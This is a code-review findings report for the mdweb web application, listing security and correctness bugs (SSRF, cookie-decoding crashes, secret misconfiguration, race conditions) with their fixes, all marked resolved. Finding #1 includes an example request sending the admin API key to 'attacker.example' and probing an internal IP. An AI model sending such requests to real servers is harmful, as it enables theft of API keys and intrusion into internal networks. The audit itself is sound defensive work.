# Code Review Findings — full project

Generated 2026-08-27 by `/code-review entire project` (16 verifiers, none refuted).

**Status 2026-08-28: all items resolved** (red → green). Regression tests live in
`tests/review-findings-server.test.ts`, `tests/review-findings-client.test.tsx`,
`tests/review-findings-admin.test.tsx`. Notes on the fixes:

- #1 `resolveAIRequest()` in `server/register-routes.ts`: overrides admin-only, http(s) only,
  stored key sent only to the stored base URL's origin; `/api/ai/models` honors `disableAI`.
- #2 `safeDecode()` in `server/lib/session-store.ts`.
- #3 preflight resolves `SESSION_SECRET || JWT_SECRET || config.jwtSecret`.
- #4 Containerfile copies pruned `node_modules` (Node 22).
- #5 canonical env file is now `/usr/local/etc/mdweb/mdweb.env` (rc script still honors the legacy path).
- #6/#7/#9/#10 client fixes in `src/lib/api.ts`, `Admin.tsx`, `Navbar.tsx`, `App.tsx`.
- #8 `withManifestLock()` in `server/lib/images.ts` serializes manifest read-modify-write.
- Cleanup: shared `sanitizeConfig()` for admin routes, `aiTransformRoute()` factory, `getActive()`
  in read-only handlers (health/config still read disk on purpose), `getPublicConfig()` memo →
  1× `/api/config` + 1× `/api/theme` on cold load.
- Port: `pkg-plist` is static; `post-install` appends dist/ + node_modules to `${TMPPLIST}`
  (`scripts/gen-plist.sh` removed). Port follows Node LTS (`USES=nodejs:lts`).


## Correctness / security (ranked)

- [x] **1. AI routes leak admin API key / SSRF** — `server/register-routes.ts:264`
  `/api/ai/summarize`, `/api/ai/enhance`, `/api/ai/models` accept caller-supplied `provider`/`baseUrl`/`modelId` from any authenticated user (including contributors) and attach the stored admin `aiConfig.apiKey` to the outbound request. `/api/ai/models` also omits the `security.disableAI` check.
  *Failure:* contributor POSTs `{provider:'openai', baseUrl:'https://attacker.example'}` → `Authorization: Bearer <admin key>` is sent to attacker. With `provider:'ollama'`, `baseUrl:'http://10.0.0.5:8080'`, `/api/ai/models` proxies into the internal network, even with `disableAI=true`.
  *Fix:* ignore client-supplied provider/baseUrl (use stored config only) or restrict overrides to admin; enforce `disableAI` on `/models`.

- [x] **2. Unguarded `decodeURIComponent` in cookie parsing → 500s** — `server/lib/session-store.ts:114`
  Malformed percent-escape in *any* cookie throws `URIError`; no Express error handler exists, so `authenticateSession` and `/api/logout` return 500.
  *Failure:* an unrelated cookie like `pct=100%` locks every session-mode user out.
  *Fix:* wrap decode in try/catch (fall back to raw value); add a global error handler.

- [x] **3. Preflight ignores `SESSION_SECRET`** — `server/lib/preflight.ts:85`
  Preflight resolves the secret as `JWT_SECRET || config.jwtSecret`, while `index.ts` / `public-config.ts` also accept `SESSION_SECRET`. In production (no TTY, rc.d) the `JWT_SECRET_DEFAULT` issue is critical and not auto-fixed, so `index.ts:45` exits `[FATAL] Pre-flight check failed` even though the secret would be accepted two lines later.
  *Fix:* make preflight use the same secret resolution as `JwtSecretFactory`.

- [x] **4. Containerfile runtime stage has no `node_modules`** — `Containerfile:16`
  Copies `dist/`, `server/`, `package*.json` but never copies `node_modules` or runs `npm ci`; only `tsx` is installed globally.
  *Failure:* `podman run` exits immediately with `ERR_MODULE_NOT_FOUND` for `express`.
  *Fix:* `COPY --from=build /app/node_modules ./node_modules` or `RUN npm ci --omit=dev` in the runtime stage.

- [x] **5. pkg env sample installed to the wrong path** — `scripts/gen-plist.sh:27`
  pkg-plist emits `@sample etc/mdweb/mdweb.env.sample` → pkg creates `/usr/local/etc/mdweb/mdweb.env`, but the rc script (`ports/www/mdweb/files/mdweb.in:21`) and deploy scripts read `/usr/local/etc/mdweb.env`.
  *Failure:* operator edits the pkg-generated file, sets `JWT_SECRET`, `service mdweb start` fails with "JWT_SECRET is missing or insecure".
  *Fix:* align the plist path with the rc script (or vice versa).

- [x] **6. Plaintext API key in GET URL** — `src/components/admin/Admin.tsx:230`
  `fetchAIModels` appends `&apiKey=<plaintext>` to `GET /api/ai/models`; the server ignores query `apiKey` and uses the stored key. Secret leaks into access/proxy logs and browser history for no effect, and the operator can't tell the new key was never used.
  *Fix:* drop the query param; if "test unsaved key" is needed, POST it in the body.

- [x] **7. Session-mode 401/403 never clears client identity** — `src/lib/api.ts:49`
  Interceptor only clears stored role/username when a localStorage `token` exists; `Login.tsx` removes `token` in session-cookie mode but stores role/username.
  *Failure:* session TTL expires / server restarts with new secret → `App.readStoredUser()` hydrates a logged-in user, `/admin` renders, every request 401/403s with no toast or redirect, navbar still says "Hello, mark".
  *Fix:* clear role/username on 401/403 regardless of token presence.

- [x] **8. Image manifest race on upload** — `server/register-routes.ts:828`
  `loadManifest()` → `await sharp(...)` → `saveManifest()` with no lock or re-read; any manifest write during the await is overwritten by the stale snapshot.
  *Failure:* concurrent uploads (or a delete during an upload) drop an entry or resurrect a deleted one; MD5 dedup then fails and `originalName` shows the generated name.
  *Fix:* serialize manifest mutations (in-process mutex/queue) or re-read + merge before write.

- [x] **9. Admin theme effect fetches hard-coded `'dark'` on mount** — `src/components/admin/Admin.tsx:91`
  Effect fetches `/theme` for the default `config.currentTheme='dark'`; sibling effect at line 80 writes the result to `document.documentElement`. `fetchConfig()` only runs for `role==='admin'`, and there's no generation guard.
  *Failure:* contributor logs in with site set to `amber` → page mis-paints to dark until reload; for admins the same happens if the `dark` response lands last.
  *Fix:* don't fetch until the real config is loaded; add a generation/abort guard.

- [x] **10. Site name/logo save doesn't update Navbar/PostDetail** — `src/components/admin/Admin.tsx:251`
  `handleSaveConfig` only updates App's `setSiteName/setSiteLogo` (footer). Navbar and PostDetail read from the `SiteConfig` singleton in `src/lib/api.ts` whose `load()` is memoized forever and whose `notify()/subscribe()` are never called.
  *Failure:* rename site → footer updates, navbar/logo/`document.title` stay stale until hard reload.
  *Fix:* invalidate/refresh the singleton after save and wire up `notify()`.

## Also confirmed (below the cap)

- [x] `server/lib/posts.ts:50` — `filename.replace('.md','')` replaces the *first* occurrence; slugs containing `.md` in the stem become unreachable. Use `replace(/\.md$/, '')`.
- [x] `server/register-routes.ts:371` — `POST /api/posts` accepts empty/undefined/whitespace slug → writes `.md` / `undefined.md`. Only the UI's `required` attribute prevents it. Validate server-side.
- [x] `server/lib/public-config.ts:170` and `register-routes.ts:705` — port defaults to 3001 vs 5173 everywhere else; a cleared port field persists 3001.
- [x] `src/components/PostDetail.tsx:20` — slug fetch has no cancellation; a slow earlier post overwrites the current one.
- [x] `src/components/admin/Admin.tsx:274,292,298,304,327,349` — six handlers chain `.then` with no `.catch` and interpolate slug/username/filename into URLs unencoded.
- [x] `src/components/ImageModals.tsx:27` — file input has `multiple` but the handler uploads only `files[0]`.

## Cleanup (all confirmed)

- [x] `POST /api/admin/config` (`register-routes.ts:608-735`) and `/api/admin/ai-config` hand-roll validation that duplicates `sanitizeConfig()` in `server/lib/config.ts` (with the 3001/5173 drift). Reuse `sanitizeConfig()`.
- [x] `/api/ai/summarize` and `/api/ai/enhance` are ~30-line verbatim copies differing only in the service method and response key. Extract a shared handler.
- [x] `loadConfig()` (sync `readFileSync` + `sanitizeConfig` + `migrateIfNeeded`) is called per request in ~12 handlers (`register-routes.ts` 54, 58, 67, 232, 349, 372, 397, 788, 821, 908, 951, and `loadAIConfig()`) despite the in-memory `getActive()` holder that is refreshed on every admin save. Caveat: `/api/health` (468) and `/api/config` (493) may intentionally re-read disk for `lastConfigStatus` — check before replacing those two.
- [x] Cold page load issues 4× `/api/config` (`App.tsx:49`, `Navbar.tsx:32` via `siteConfig.load()`, `Navbar.tsx:42`, `Home.tsx:24`) and 2× `/api/theme` (`applyTheme()` from `App.tsx:64` and `Navbar.tsx:47`). One of each would suffice.
